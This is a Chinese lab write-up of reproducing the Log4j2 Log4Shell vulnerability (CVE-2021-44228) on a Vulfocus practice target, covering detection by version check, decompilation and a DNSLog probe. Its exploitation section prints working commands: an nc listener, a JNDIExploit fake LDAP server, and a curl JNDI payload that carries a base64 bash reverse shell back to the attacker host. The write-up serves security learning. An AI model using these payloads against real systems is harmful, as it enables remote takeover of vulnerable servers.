# Vulfocus复现log4j2(CVE-2021-44228)漏洞实验



## 一.实验环境
* kali2024.3
* Vulfocus
* Docker ：20.10
* Docker-Compose ：1.29
* 漏洞环境：Vulfocus 提供的 Log4j2 漏洞靶场
## 二.实验目的
* 复现 Log4j2 远程代码执行（RCE）漏洞（CVE-2021-44228）
* 利用 JNDI 注入实现远程命令执行
* 探索漏洞利用及防御措施
## 三.实验过程

### 1、环境搭建
* 安装 Docker 和 Docker-Compose
* 安装 Vulfocus
* Vulfocus Web 界面启动该靶场。

  ![alt text](./images/image.png)

  访问地址`访问地址: 192.168.56.121:36795`

  ![alt text](images\image-1.png)



### 2、log4j2漏洞复现
#### （1）、log4j2漏洞原理
 
CVE-2021-44228（Log4Shell）是 Apache Log4j2 组件中的一个 远程代码执行（RCE）漏洞。该漏洞允许攻击者通过 JNDI 注入，利用 LDAP 服务器 加载远程恶意代码，从而在目标服务器上执行任意代码。主要影响的版本为Log4j 2.0-beta9 ~ 2.14.1
#### （2）、检测漏洞存在性
* 方法一：确认受漏洞影响组件的版本号，此漏洞主要影响的版本为Log4j 2.0-beta9 ~ 2.14.1
  * 查看容器名称
     ```
     docker ps

     ```
     ![alt text](images\image-2.png)

  * 进入容器Shell`docker exec -it cool_gould /bin/bash`
  * 下载demo.jar文件到本地并查看`docker cp 19ea57acca57:/demo/demo.jar ~/Downloads/`
  很明显看到此log4j2的版本为2.14.0，属于漏洞版本

    ![alt text](images\image-3.png)
* 方法二：反汇编dome.jar文件，找到漏洞代码并定位到其中的传递参数（`log4j2逆向`）
   * 下载Java Decompiler反汇编工具`https://java-decompiler.github.io/`
   * 使用Java Decompiler反汇编工具对demo.jar文件进行反汇编，并查看其中的代码
   
     ![alt text](images\image-7.png)
   * **漏洞代码分析**：
      *   在以下代码中`payload` 变量直接传递到 `logger` 进行日志记录。没有进行任何过滤，意味着如果 `payload` 是恶意 `JNDI `语句，Log4j2 会执行 JNDI 解析。导致攻击者可以构造恶意 ${jndi:ldap://...} 语句，让服务器远程加载并执行恶意代码，最终实现 远程代码执行（RCE）。
     ```
      logger.error("{}", payload);
      logger.info("{}", payload);
      logger.info(payload);
      logger.error(payload);
     ```
     * 这两行代码 明确 开启了 JNDI 远程加载。JNDI 本应默认不允许加载远程代码，但这里强行启用了该功能，使漏洞更容易被利用。
     
      ```
       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
       System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

       ```
* 方法三：（使用 PoC 手动测试 ${jndi:ldap://0qxc3d.dnslog.cn/exp}）
  * **使用此方法的优点**：DNSLog 提供了一个 唯一的子域名，可以用来监听 目标服务器是否解析了我们提供的 JNDI 网址。并且无需搭建服务器，只需要获取 一个随机子域名，目标服务器如果解析它，我们就可以在 DNSLog 平台上看到记录，证明目标可能存在漏洞。
  * 获取 DNSLog 专属子域名：访问 DNSLog 平台：`http://dnslog.cn/`点击 `“获取子域名”`，它会生成一个唯一的随机子域，`i6dryn.dnslog.cn`

  ![alt text](images\image-4.png)
  * 构造无害 `Payload`，向靶机发送包含 JNDI 协议的恶意 JNDI 载荷，触发 DNS 解析
   `curl 'http://192.168.56.121:39327/hello' -G --data-urlencode 'payload=${jndi:dns://i6dryn.dnslog.cn}'`

    ![alt text](images\image-5.png)
   * 访问 DNSLog 平台，查看解析记录，目标服务器的 Log4j 解析了 {jndi:dns://i6dryn.dnslog.cn}'`并尝试访  问 LDAP 服务器。访问 `i6dryn.dnslog.cn` 说明目标服务器被成功诱导解析，这证明 Log4j2 可能存在漏洞。

    ![alt text](images\image-6.png)

#### （3）、漏洞可利用性验证
##### <1>、下载JNDIExploit.v1.2 Java 反序列化漏洞利用工具，并解压
`wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip `
  
![alt text](images\image-11.png)


##### <2>、在在攻击者机器（ 192.168.56.123）上运行：
`nc -l -p 7777`它会在 端口 7777 上监听 传入的连接。此时，如果目标服务器反向连接到这个端口，攻击者就可以获取远程shell 访问权限。



##### <3>、启动 JNDIExploit 工具，伪造一个 LDAP/RMI 服务器
`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.123`
该命令用于 启动 JNDIExploit 工具，伪造一个 LDAP 服务器，监听 IP 192.168.56.123，以便利用 Java 应用程序的 JNDI 注入漏洞（如 Log4Shell）。当目标服务器解析特定 JNDI 语句（如 ${jndi:ldap://192.168.56.123:1389/Exploit}）时，会从该伪造服务器加载恶意代码，从而实现远程代码执行（RCE）或反向 shell 攻击。

##### <4>、发送 GET 请求， 触发 JNDI 注入漏洞
该命令通过 curl 发送 GET 请求，尝试在目标服务器 `192.168.56.121:30815` 触发 JNDI 注入漏洞，并让目标服务器从攻击者的 伪造 LDAP 服务器 (`192.168.56.123:1389`) 下载并执行恶意代码。
```
curl -G http://192.168.56.121:30815/hello --data-urlencode 'payload=${jndi:ldap://192.168.56.123:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.56.123/7777 0>&1' | base64 -w 0 | sed 's/+/%2B/g' | sed 's/=/%3d/g')'}'

```
![alt text](images\image-13.png)
##### <5>、当发送get请求后，可以看到让目标服务器通过 LDAP 服务器下载 Base64 编码的反向 shell，从而远程控制目标机器
![alt text](images\image-14.png)
##### <6>、在攻击者主机中输入`ls /tmp`显示靶机的flag，将flag输入vulfocus中，成功完成漏洞可利用性验证
![alt text](images\image-15.png)

![alt text](images\image-12.png)

#### 3、log4j2逆向（见漏洞存在性检测方法二）


 
